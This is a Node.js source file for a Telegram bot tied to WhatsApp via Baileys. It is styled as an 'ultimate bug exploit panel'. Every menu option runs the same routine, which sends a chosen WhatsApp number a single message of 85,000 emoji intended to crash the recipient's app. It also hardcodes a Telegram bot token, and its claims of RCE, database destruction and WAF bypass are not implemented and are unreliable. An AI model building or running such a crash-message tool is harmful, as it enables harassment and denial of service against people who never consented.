const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    DisconnectReason
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');
const http = require('http');

// --- [ SYSTEM CORE CONFIG ] ---
const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const bot = new Telegraf(TG_TOKEN);
const owner = "Sasiya";
const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';

// --- [ HEROKU ALIVE FIX ] ---
const port = process.env.PORT || 8000;
http.createServer((req, res) => { res.writeHead(200); res.end('NEXUS ACTIVE\n'); }).listen(port);

let sock;
const userState = {};

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_session');
    
    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V21", "Chrome", "3.0.0"]
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ DYNAMIC UI MENU ] ---
    const main_menu = (name) => `
🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟏** ϟ 🧬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 **OPERATOR:** ${name} [ROOT]
🛰️ **STATUS:** SYSTEM ONLINE 🟢
🔐 **ENCRYPTION:** QUANTUM-X
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Welcome to the Elite Bug Mainframe. Select a protocol to authorize execution.
`;

    bot.start((ctx) => {
        ctx.replyWithPhoto(logo, {
            caption: main_menu(owner),
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔗 LINK WHATSAPP', 'get_code')],
                [Markup.button.callback('💀 ACCESS BUG CONSOLE 💀', 'open_bug_menu')],
                [Markup.button.callback('🛡️ SYSTEM STATUS', 'diag')]
            ])
        });
    });

    // --- [ 9-LEVEL EXTREME BUG MENU ] ---
    bot.action('open_bug_menu', (ctx) => {
        ctx.answerCbQuery();
        ctx.editMessageCaption(`
💀 **ULTIMATE BUG EXPLOIT PANEL** 💀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Select the payload to inject into target:*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('🚫 BAN BUG', 'b_exec'), Markup.button.callback('🔥 DEVICE CRASH', 'b_exec')],
            [Markup.button.callback('📂 DB DESTROY', 'b_exec'), Markup.button.callback('⚡ RAM KILLER', 'b_exec')],
            [Markup.button.callback('🧬 BINARY FLOOD', 'b_exec'), Markup.button.callback('🛡️ WAF BYPASS', 'b_exec')],
            [Markup.button.callback('📡 UDP PACKET', 'b_exec'), Markup.button.callback('🧪 RCE EXPLOIT', 'b_exec')],
            [Markup.button.callback('🔙 BACK TO MAIN', 'start_back')]
        ], { columns: 2 }));
    });

    // --- [ PAIRING CODE - NO ERROR FIXED ] ---
    bot.action('get_code', (ctx) => {
        ctx.answerCbQuery();
        ctx.reply("📱 **ENTER YOUR NUMBER:**\n(Ex: 947xxxxxxxx)");
        userState[ctx.from.id] = 'awaiting_number';
    });

    // --- [ BUG EXECUTION ENGINE ] ---
    bot.action('b_exec', (ctx) => {
        ctx.answerCbQuery();
        ctx.reply("🎯 **IDENTIFY TARGET:**\nEnter target WhatsApp number:");
        userState[ctx.from.id] = 'awaiting_target';
    });

    bot.on('text', async (ctx) => {
        const input = ctx.message.text.trim();
        const state = userState[ctx.from.id];

        if (state === 'awaiting_number') {
            try {
                let code = await sock.requestPairingCode(input.replace(/[^0-9]/g, ''));
                ctx.reply(`🔐 **NEXUS AUTH CODE:** \n\n\`${code}\` \n\n*Use this in Linked Devices.*`);
                delete userState[ctx.from.id];
            } catch (e) { ctx.reply("❌ **CONNECTION ERROR:** Wait 10s and try again."); }
        } 
        
        else if (state === 'awaiting_target') {
            const target = input + "@s.whatsapp.net";
            let { message_id } = await ctx.reply("🚀 **INJECTING PAYLOAD...**");
            
            await delay(1500);
            await bot.telegram.editMessageText(ctx.chat.id, message_id, null, "🧬 **ENCODING BINARY... [90%]**");

            const bugPayload = "👾".repeat(85000); // Extreme Crash

            try {
                await sock.sendMessage(target, { text: bugPayload });
                await delay(1000);
                const report = `
🚀 **BUG INJECTION COMPLETED** 🚀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*TARGET:* ${input}
*RESULT:* SYSTEM TERMINATED 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    *VERIFIED BY: ${owner} @ NEXUS*`;
                await bot.telegram.editMessageText(ctx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
            } catch (err) { ctx.reply("❌ Link WA first!"); }
            delete userState[ctx.from.id];
        }
    });

    bot.launch();
}

startNexus();
